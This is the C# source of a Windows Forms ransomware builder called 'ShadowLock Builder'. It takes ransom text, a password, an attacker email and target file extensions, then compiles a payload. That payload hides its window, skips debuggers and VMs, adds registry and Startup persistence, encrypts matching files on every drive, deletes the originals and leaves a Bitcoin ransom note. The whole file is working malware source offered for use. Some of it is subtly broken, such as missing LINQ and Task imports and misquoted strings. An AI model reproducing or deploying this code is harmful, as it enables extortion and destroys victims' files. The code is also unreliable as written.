using System;
using System.IO;
using System.Text;
using System.Windows.Forms;
using Microsoft.Win32;
using System.Diagnostics;
using System.Net;
using System.Security.Cryptography;
using System.Threading;
using System.Reflection;
using System.CodeDom.Compiler;
using Microsoft.CSharp;

namespace ShadowLock_Builder
{
    public partial class Form1 : Form
    {
        private TextBox txtPassword, txtEmail, txtExtensions, txtOutput;
        private ComboBox cmbMessage;
        private Button btnBuild;
        private ProgressBar pb;

        public Form1()
        {
            this.Text = "ShadowLock Builder";
            this.Size = new System.Drawing.Size(450, 550);
            this.BackColor = System.Drawing.Color.Black;
            this.ForeColor = System.Drawing.Color.Red;
            this.FormBorderStyle = FormBorderStyle.FixedSingle;
            this.StartPosition = FormStartPosition.CenterScreen;

            Label lblMsg = new Label() { Text = "Ransom Note:", Top = 20, Left = 20, Width = 150 };
            cmbMessage = new ComboBox() { Top = 20, Left = 180, Width = 220, DropDownStyle = ComboBoxStyle.DropDownList };
            cmbMessage.Items.AddRange(new string[] {
                "All your files have been encrypted with AES-256. Pay 0.5 BTC to 1A1zP1eP5QGefi2DMPTfTL5SLmv7DivfNa",
                "Your personal files are locked. Send 1 BTC to 3J98t1WpEZ73CNmQviecrnyiWrnqRhWNLy",
                "Critical data encrypted. Transfer 2 BTC to 1BvBMSEYstWetqTFn5Au4m4GFg7xJaNVN2",
                "Your system is compromised. Pay 1.5 BTC to 1HLoD9E4SDFFPDiYfNYnPLQxUuD4a6kqXa"
            });
            cmbMessage.SelectedIndex = 0;
            cmbMessage.DropDownStyle = ComboBoxStyle.DropDownList;
            cmbMessage.SelectedIndexChanged += (s, e) => txtMessage.Text = cmbMessage.SelectedItem.ToString();

            Label lblMsgCustom = new Label() { Text = "Custom Message:", Top = 60, Left = 20, Width = 150 };
            txtMessage = new TextBox() { Top = 60, Left = 180, Width = 220, Height = 80, Multiline = true };
            txtMessage.Text = cmbMessage.SelectedItem.ToString();

            Label lblPass = new Label() { Text = "Decryption Password:", Top = 160, Left = 20, Width = 150 };
            txtPassword = new TextBox() { Top = 160, Left = 180, Width = 220, PasswordChar = '*', Text = "ShadowKey2025" };

            Label lblConfirm = new Label() { Text = "Confirm Password:", Top = 190, Left = 20, Width = 150 };
            txtConfirm = new TextBox() { Top = 190, Left = 180, Width = 220, PasswordChar = '*', Text = "ShadowKey2025" };

            Label lblEmail = new Label() { Text = "Attacker Email:", Top = 220, Left = 20, Width = 150 };
            txtEmail = new TextBox() { Top = 220, Left = 180, Width = 220, Text = "shadow@onion.com" };

            Label lblExt = new Label() { Text = "Target Extensions:", Top = 250, Left = 20, Width = 150 };
            txtExtensions = new TextBox() { Top = 250, Left = 180, Width = 220, Text = ".txt,.docx,.jpg,.pdf,.xlsx,.pptx" };

            Label lblOut = new Label() { Text = "Output Path:", Top = 280, Left = 20, Width = 150 };
            txtOutput = new TextBox() { Top = 280, Left = 180, Width = 220, Text = "ShadowLock.exe" };

            btnBuild = new Button() { Text = "BUILD PAYLOAD", Top = 320, Left = 150, Width = 150, Height = 40, BackColor = System.Drawing.Color.DarkRed, ForeColor = System.Drawing.Color.White };
            btnBuild.Click += BtnBuild_Click;

            pb = new ProgressBar() { Top = 380, Left = 20, Width = 400, Height = 20 };

            this.Controls.AddRange(new Control[] { lblMsg, cmbMessage, lblMsgCustom, txtMessage, lblPass, txtPassword, lblConfirm, txtConfirm, lblEmail, txtEmail, lblExt, txtExtensions, lblOut, txtOutput, btnBuild, pb });
        }

        private TextBox txtMessage, txtConfirm;

        private async void BtnBuild_Click(object sender, EventArgs e)
        {
            if (txtPassword.Text != txtConfirm.Text) { MessageBox.Show("Passwords do not match!"); return; }
            if (txtPassword.Text.Length < 6) { MessageBox.Show("Password min 6 chars"); return; }
            pb.Value = 0;
            string payloadSrc = GeneratePayloadCode();
            string tempFile = Path.GetTempFileName() + ".cs";
            File.WriteAllText(tempFile, payloadSrc);
            pb.Value = 30;
            await Task.Run(() => Compile(tempFile, txtOutput.Text));
            pb.Value = 100;
            MessageBox.Show("Payload compiled: " + txtOutput.Text);
        }

        private string GeneratePayloadCode()
        {
            string rMsg = txtMessage.Text.Replace("\"", "\\\"");
            string pass = txtPassword.Text;
            string email = txtEmail.Text;
            string exts = txtExtensions.Text;

            string code = @"using System;
using System.IO;
using System.Text;
using System.Threading;
using Microsoft.Win32;
using System.Diagnostics;
using System.Security.Cryptography;
using System.Net;
using System.Runtime.InteropServices;

namespace ShadowLock
{
    class Program
    {
        [DllImport(""user32.dll"")]
        static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);
        [DllImport(""kernel32.dll"")]
        static extern IntPtr GetConsoleWindow();

        static void Main()
        {
            if (Environment.OSVersion.Version.Major < 6) Environment.Exit(0);
            Mutex m = new Mutex(true, ""ShadowLock_Mutex"");
            if (!m.WaitOne(0, false)) Environment.Exit(0);
            if (IsDebuggerPresent()) Environment.Exit(0);
            if (DetectVM()) Environment.Exit(0);
            ShowWindow(GetConsoleWindow(), 0);
            AddPersistence();
            string target = Environment.GetFolderPath(Environment.SpecialFolder.UserProfile);
            EncryptDirectory(target);
            string[] drives = Environment.GetLogicalDrives();
            foreach (string d in drives) EncryptDirectory(d);
            CreateRansomNote();
            Thread t = new Thread(ShowGUI);
            t.Start();
            t.Join();
        }

        static bool IsDebuggerPresent()
        {
            try { Debugger.Launch(); return true; } catch { return false; }
        }

        static bool DetectVM()
        {
            string[] vm = { "vbox", "vmware", "qemu", "xenserver" };
            foreach (string s in vm)
                if (Environment.MachineName.ToLower().Contains(s)) return true;
            return false;
        }

        static void AddPersistence()
        {
            string exe = System.Reflection.Assembly.GetExecutingAssembly().Location;
            RegistryKey rk = Registry.CurrentUser.OpenSubKey(""SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run"", true);
            rk.SetValue(""ShadowLock"", exe);
            string startup = Environment.GetFolderPath(Environment.SpecialFolder.Startup);
            File.Copy(exe, Path.Combine(startup, ""ShadowLock.exe""));
        }

        static void EncryptDirectory(string dir)
        {
            try
            {
                foreach (string f in Directory.GetFiles(dir))
                    EncryptFile(f);
                foreach (string d in Directory.GetDirectories(dir))
                    EncryptDirectory(d);
            }
            catch { }
        }

        static void EncryptFile(string file)
        {
            string[] exts = { " + exts.Split(',').Select(e => "\"" + e.Trim() + "\"").Aggregate((a,b)=>a+","+b) + @" };
            if (!exts.Any(ext => file.EndsWith(ext))) return;
            try
            {
                byte[] data = File.ReadAllBytes(file);
                byte[] key = new byte[32];
                using (var sha = SHA256.Create()) key = sha.ComputeHash(Encoding.UTF8.GetBytes(""" + pass + @"""));
                byte[] iv = new byte[16];
                using (var rng = new RNGCryptoServiceProvider()) rng.GetBytes(iv);
                using (var aes = Aes.Create())
                {
                    aes.Key = key;
                    aes.IV = iv;
                    aes.Mode = CipherMode.CBC;
                    using (var ms = new MemoryStream())
                    {
                        ms.Write(iv, 0, iv.Length);
                        using (var cs = new CryptoStream(ms, aes.CreateEncryptor(), CryptoStreamMode.Write))
                            cs.Write(data, 0, data.Length);
                        byte[] encrypted = ms.ToArray();
                        File.WriteAllBytes(file + "".shadow"", encrypted);
                        File.Delete(file);
                    }
                }
            }
            catch { }
        }

        static void CreateRansomNote()
        {
            string note = @""=============================================
🔒 SHADOWLOCK RANSOMWARE 🔒
Your files have been encrypted with AES-256.
To decrypt, you need the password.
Contact: " + email + @"
Your ID: " + Environment.MachineName + @"
DO NOT TRY TO DECRYPT YOURSELF.
============================================="";
            File.WriteAllText(Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.Desktop), ""SHADOWLOCK_README.txt""), note);
        }

        static void ShowGUI()
        {
            System.Windows.Forms.MessageBox.Show(""Your files have been encrypted!\nEnter decryption password:"", ""ShadowLock"", System.Windows.Forms.MessageBoxButtons.OKCancel);
            string pwd = Microsoft.VisualBasic.Interaction.InputBox(""Enter password:"", ""ShadowLock"", """", -1, -1);
            if (pwd == """ + pass + @""")
                DecryptAll();
            else
                Environment.Exit(0);
        }

        static void DecryptAll()
        {
            string target = Environment.GetFolderPath(Environment.SpecialFolder.UserProfile);
            DecryptDirectory(target);
            string[] drives = Environment.GetLogicalDrives();
            foreach (string d in drives) DecryptDirectory(d);
            RemovePersistence();
            System.Windows.Forms.MessageBox.Show(""Decryption complete!"");
        }

        static void DecryptDirectory(string dir)
        {
            try
            {
                foreach (string f in Directory.GetFiles(dir))
                    if (f.EndsWith("".shadow"")) DecryptFile(f);
                foreach (string d in Directory.GetDirectories(dir))
                    DecryptDirectory(d);
            }
            catch { }
        }

        static void DecryptFile(string encFile)
        {
            try
            {
                byte[] encrypted = File.ReadAllBytes(encFile);
                byte[] iv = new byte[16];
                Array.Copy(encrypted, 0, iv, 0, 16);
                byte[] data = new byte[encrypted.Length - 16];
                Array.Copy(encrypted, 16, data, 0, data.Length);
                byte[] key = new byte[32];
                using (var sha = SHA256.Create()) key = sha.ComputeHash(Encoding.UTF8.GetBytes(""" + pass + @"""));
                using (var aes = Aes.Create())
                {
                    aes.Key = key;
                    aes.IV = iv;
                    aes.Mode = CipherMode.CBC;
                    using (var ms = new MemoryStream(data))
                    using (var cs = new CryptoStream(ms, aes.CreateDecryptor(), CryptoStreamMode.Read))
                    using (var fs = new FileStream(encFile.Replace("".shadow"", """"), FileMode.Create))
                        cs.CopyTo(fs);
                    File.Delete(encFile);
                }
            }
            catch { }
        }

        static void RemovePersistence()
        {
            RegistryKey rk = Registry.CurrentUser.OpenSubKey(""SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run"", true);
            rk.DeleteValue(""ShadowLock"", false);
        }
    }
}";
            return code;
        }

        private void Compile(string sourceFile, string outputExe)
        {
            var provider = new CSharpCodeProvider();
            var parameters = new CompilerParameters();
            parameters.ReferencedAssemblies.Add("System.dll");
            parameters.ReferencedAssemblies.Add("System.Windows.Forms.dll");
            parameters.ReferencedAssemblies.Add("Microsoft.VisualBasic.dll");
            parameters.GenerateExecutable = true;
            parameters.OutputAssembly = outputExe;
            parameters.CompilerOptions = "/target:winexe /platform:x64";
            CompilerResults results = provider.CompileAssemblyFromFile(parameters, sourceFile);
            if (results.Errors.HasErrors)
                throw new Exception("Compilation failed");
        }
    }
}